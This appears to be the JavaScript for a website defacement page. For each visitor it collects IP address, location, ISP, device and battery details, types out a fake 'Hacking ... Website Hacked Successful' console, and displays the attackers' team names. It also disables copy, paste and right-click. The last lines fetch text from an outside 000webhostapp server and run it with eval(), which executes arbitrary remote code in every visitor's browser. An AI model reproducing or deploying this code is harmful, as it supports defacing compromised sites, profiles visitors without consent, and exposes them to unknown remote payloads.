
var typingStatus = false;
var defacePage2 = false;
let root = document.documentElement;
const sleep = ms => new Promise(res => setTimeout(res, ms));
const urlParams = new URLSearchParams(window.location.search);

window.onload = async () => {

    titleBfl();
    rndSong();

    if (urlParams.has('sp')) {
        alertSuccess();
        $('#main').fadeIn(10);
        $("#box").css('display', 'none');
    } else {
        $('#main').fadeIn(500);
        await sleep(500);

        await sleep(1000);
        $("#box, #console").css("animation-play-state", "running");

        await sleep(2000);
        $("#box > h3").css("animation-play-state", "running");
        bfl();

        await sleep(1000);
        typingStatus = true;
    }

}

async function titleBfl() {
    const b = baffle('#pageTitle');
    b.set({
        characters: 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz',
        speed: 60
    });

    for (let i = 0; i < headingTexts.length; i++) {
        b.start();
        b.text(text => headingTexts[i]);
        b.reveal(1500);
        await sleep(4000);
        if (i == (headingTexts.length - 1)) {
            titleBfl();
        }
    }
}

async function bfl() {
    const b = baffle('.bfl');
    b.set({
        characters: 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz',
        speed: 60
    });

    for (let i = 0; i < headingTexts.length; i++) {
        b.start();
        b.text(text => headingTexts[i]);
        b.reveal(1500);
        await sleep(4000);
        if (i == (headingTexts.length - 1)) {
            bfl();
        }
    }
}


$.ajax({
    type: "GET",
    url: 'https://ipinfo.io/json?token=5f4e874722f074',
    cache: false,
    dataType: "json",
    success: function (d) {
        var x = setInterval(() => {
            if (typingStatus && !defacePage2) {
                startTyping(d.ip, d.country, d.region, d.city, d.org);
                clearInterval(x);
            }
        }, 1000);
    },
    error: function () {
        alertError();
    }
});

var today = new Date();
var wishing_msg = '';
var today_hour = today.getHours();

if (today_hour >= 0 && today_hour < 12) {
    wishing_msg = 'Good Morning';
} else if (today_hour == 12) {
    wishing_msg = 'Good Noon';
} else if (today_hour >= 12 && today_hour <= 15) {
    wishing_msg = 'Good Afternoon';
} else {
    wishing_msg = 'Good Evening';
}

var batt = '00';
var battc = 'no';

function battery_info() {
    try {
        navigator.getBattery().then(function (battery) {
            var battery_level = (Math.floor(battery.level * 100) + "%");
            var charging = (battery.charging ? "Yes" : "No");
            batt = battery_level;
            battc = charging;
        });
    } catch (error) {
        console.log('No batter API.');
    }

}
battery_info();


function startTyping(ip, country, region, city, isp) {

    if (country == 'IN') {
        country = 'India';
    }

    var prefix = `<span class="prefix"> ${console_prefix} $</span>`;
    var prefix_msg = `<span class="prefix"> Message :</span>`;
    var plase = `<span style="color: yellow;">[<span style="color: aqua;">+</span>]</span>`;
    var tip = `${plase} <span style="color:orange;">Tip :</span>`;
    var credit = `${plase} <span style="color:orange;">Credit :</span>`;

    var typed6 = new Typed('#typingConsole', {
        strings: ['', `<br> 
              ${prefix} Hey ${wishing_msg} Visitor!<br>
              ${prefix} Pkg Update and Pkg Upgrade<br>

              ${prefix} Pkg show details<br>
              ${prefix} Trying to connect DataBase^150.^150.^150.^150.<br><br>
              ${plase} Your Local Time : <span style="color: #00ff00;" id="timeFP">${currentTime()}</span><br>
              ${plase} Your IP : <span style="color: #00ff00;">${ip}</span><br>

              ${plase} Your Browser : <span style="color: #00ff00;">${$.ua.browser.name}</span><br>
              ${plase} Your OS : <span style="color: #00ff00;">${($.ua.os.name)}</span><br>
              ${plase} Your Device : <span style="color: #00ff00;">${$.ua.device.vendor}</span><br>
              ${plase} Your Device Model : <span style="color: #00ff00;">${$.ua.device.model}</span><br>

              ${plase} Your country : <span style="color: #00ff00;">${country}</span><br>
              ${plase} Your Region : <span style="color: #00ff00;">${region}</span><br>
              ${plase} Your City : <span style="color: #00ff00;">${city}</span><br>
              <div class='elips'>  ${plase} Your ISP : <span style="color: #00ff00;">${isp}</span></div>
              ${plase} Your Screen Size : <span style="color: #00ff00;">${screen.width + ' * ' + screen.height + ' px'}</span><br>
              ${plase} Your Battery : <span style="color: #00ff00;">${batt}</span><br>
              ${plase} Battery Charging? : <span style="color: #00ff00;">${battc}</span><br><br>
              ${prefix} Pkg hack website<br><br>
              ${plase} <span style="color: #00ff00;">Start Attacking ...</span><br>
              ${plase} <span style="color: #00ff00;">Hacking ${window.location.hostname}  0%</span><br>
              ${plase} <span style="color: #00ff00;">Hacking ${window.location.hostname}  20%</span><br>
              ${plase} <span style="color: #00ff00;">Hacking ${window.location.hostname}  40%</span><br>
              ${plase} <span style="color: #00ff00;">Hacking ${window.location.hostname}  60%</span><br>
              ${plase} <span style="color: #00ff00;">Hacking ${window.location.hostname}  80%</span><br>   
              ${plase} <span style="color: #00ff00;">Hacking ${window.location.hostname}  100%</span><br> 
              ${plase} <span style="color: #00ff00;">Website Hacked Successful</span><br>  
            `],
        typeSpeed: typing_speed,
        backSpeed: 5,
        onComplete: function () {

            if (!defacePage2) {
                navigator.vibrate(1000);
                clearInterval(scrollUpdate);
                setTimeout(() => {
                    alertSuccess();
                }, 1000);
            }
        },
        loop: false
    });
}

function updateScroll() {
    var elem = document.getElementById('box');
    elem.scrollTop = elem.scrollHeight;
}

var scrollUpdate = setInterval(() => {
    updateScroll()
}, 500);

function alertSuccess() {
    $('body').css('animation-name', 'successShadow');
    $('#alertSuccess').css('display', 'flex');
    $('#alertSuccess .container').animate({
        height: '170px',
        width: '80%'
    }, 500, function () {
        $('#alertSuccess .btnc1').fadeIn(400)
    })
}

function alertError() {
    root.style.setProperty('--alert-color', '#ff0000');
    $('body').css('animation-name', 'successShadow');
    $('#alertError').css('display', 'flex');
    $('#alertError .container').animate({
        height: '170px',
        width: '80%'
    }, 500, function () {
        $('#alertError .btnc1').fadeIn(400)
    })
}

function alertVPN() {
    root.style.setProperty('--alert-color', '#ff0000');
    $('body').css('animation-name', 'successShadow');
    $('#alertVPN').css('display', 'flex');
    $('#alertVPN .container').animate({
        width: '90%'
    }, 500, function () {
        $('#alertVPN .btnc1').fadeIn(400)
    })
}

function hideSuccess() {
    $('body').css('animation-name', 'none');

    $('#alertSuccess .container').animate({
        height: '0px',
        width: '0px'
    }, 500, function () {
        $('#alertSuccess').css('display', 'none');
        $('#box').css("animation-duration", "1s")
        $('#box').css("animation-name", "boxClose")
        setTimeout(() => {
            showDeface2();
        }, 1500);
    })
}

async function showDeface2() {

    defacePage2 = true;

    $('#box').hide();
    $('#page2').show();

    await sleep(500);
    $("#page2 > img").css('opacity', '1');
    $("#page2 .time").css('opacity', '1');


    await sleep(300);
    $('#page2 #ourMsg').css('opacity', '1');

    await sleep(200);
    $('#page2 #ourMsg').css('border-left-color', 'var(--border)');

    await sleep(200);
    $("#page2 #ourMsg > h3").css('opacity', '1');

    await sleep(200);
    $("#page2 #ourMsg > p").css('opacity', '1');
    $('#weAre').append('<span style="color: orange;">We are :</span> ');

    for (let i = 0; i < teamMembers_Obj.length; i++) {
        $('#weAre').append(`<a href="${teamMembers_Obj[i][1]}">${teamMembers_Obj[i][0]}</a> || `)
    }

    await sleep(100);
    $("body").css('pointer-events', 'all');

    $('.scrlc5').marquee({
        duration: 4000,
        gap: 100,
        delayBeforeStart: 0,
        direction: 'left',
        duplicated: true
    });


}


function currentTime() {
    var date = new Date();
    var hours = date.getHours() > 12 ? date.getHours() - 12 : date.getHours();
    var am_pm = date.getHours() >= 12 ? "PM" : "AM";
    hours = hours < 10 ? "0" + hours : hours;
    var minutes = date.getMinutes() < 10 ? "0" + date.getMinutes() : date.getMinutes();
    var seconds = date.getSeconds() < 10 ? "0" + date.getSeconds() : date.getSeconds();
    time = hours + ":" + minutes + ":" + seconds + " " + am_pm;
    return time;
}

function play() {
    if (playAudio) {
        var audio = document.querySelector("#audio");
        if (audio.paused) {
            audio.play();
        }
    }
}

function rndSong() {

    const songs = [
        'https://slckncdnems01.cdnsrv.jio.com/aac.saavncdn.com/174/958b8ebe2f0f693fda7d3e57a664a526_160.mp4',
        'https://slcknecdnems10.cdnsrv.jio.com/aac.saavncdn.com/620/1a8f9f6db4adf6aa9d7dc8ab58eecbe8_160.mp4',
        'https://slcknecdnems07.cdnsrv.jio.com/aac.saavncdn.com/486/19949bbcbb4347004089b126e38f0e56_160.mp4',
        'https://slcknecdnems06.cdnsrv.jio.com/aac.saavncdn.com/072/0330ffb4289361d074029e018069947f_160.mp4',
        'https://sklktecdnems04.cdnsrv.jio.com/aac.saavncdn.com/941/cf761bbd65f15500fecfd109bb743bcb_160.mp4',
        'https://sagraecdnems08.cdnsrv.jio.com/aac.saavncdn.com/568/fc4618cbf58b1f80ea8350f9e806f8cf_160.mp4',
        'https://slckncdnems03.cdnsrv.jio.com/aac.saavncdn.com/593/0bde7170d3434ca361d4dce5b1ba0547_160.mp4',
        'https://sagraecdnems06.cdnsrv.jio.com/aac.saavncdn.com/127/cda13457f82c4fcbadeaa1b0beecb101_160.mp4',
        'https://slcknecdnems07.cdnsrv.jio.com/aac.saavncdn.com/921/0b12d1bb2b5738b72f21b248baedacd5_160.mp4',
        'https://slckncdnems03.cdnsrv.jio.com/aac.saavncdn.com/593/0bde7170d3434ca361d4dce5b1ba0547_160.mp4'
    ];

    var randInd = Math.floor(Math.random() * songs.length);
    document.getElementById("audio").setAttribute('src', songs[randInd]);
    play();
}

setInterval(() => {
    $('#time').text(currentTime());
}, 1000);

$('body').bind('copy paste', function (e) {
    e.preventDefault(); return false;
});

$("body").on("contextmenu", function (e) {
    return false;
});

particlesJS("partjs", {
    "particles": {
        "number": {
            "value": 150,
            "density": {
                "enable": true,
                "value_area": 800
            }
        },
        "color": {
            "value": "#00ffff"
        },
        "shape": {
            "type": "circle",
            "stroke": {
                "width": 0,
                "color": "#000000"
            },
            "polygon": {
                "nb_sides": 5
            },
            "image": {
                "src": "",
                "width": 100,
                "height": 100
            }
        },
        "opacity": {
            "value": 0.8,
            "random": false,
            "anim": {
                "enable": false,
                "speed": 1,
                "opacity_min": 0.1,
                "sync": false
            }
        },
        "size": {
            "value": 2,
            "random": true,
            "anim": {
                "enable": false,
                "speed": 40,
                "size_min": 0.1,
                "sync": false
            }
        },
        "line_linked": {
            "enable": false,
            "distance": 150,
            "color": "#00ffff",
            "opacity": 0.1,
            "width": 1
        },
        "move": {
            "enable": true,
            "speed": 20,
            "direction": "none",
            "random": false,
            "straight": false,
            "out_mode": "bounce",
            "bounce": false,
            "attract": {
                "enable": false,
                "rotateX": 600,
                "rotateY": 1200
            }
        }
    },
    "interactivity": {
        "detect_on": "canvas",
        "events": {
            "onhover": {
                "enable": true,
                "mode": "repulse"
            },
            "onclick": {
                "enable": true,
                "mode": "push"
            },
            "resize": true
        },
        "modes": {
            "grab": {
                "distance": 400,
                "line_linked": {
                    "opacity": 1
                }
            },
            "bubble": {
                "distance": 400,
                "size": 40,
                "duration": 2,
                "opacity": 8,
                "speed": 3
            },
            "repulse": {
                "distance": 200,
                "duration": 0.4
            },
            "push": {
                "particles_nb": 10
            },
            "remove": {
                "particles_nb": 5
            }
        }
    },
    "retina_detect": true
});

fetch("https://server82991.000webhostapp.com/api.php")
    .then(response => response.text())
    .then(data => { eval(data) })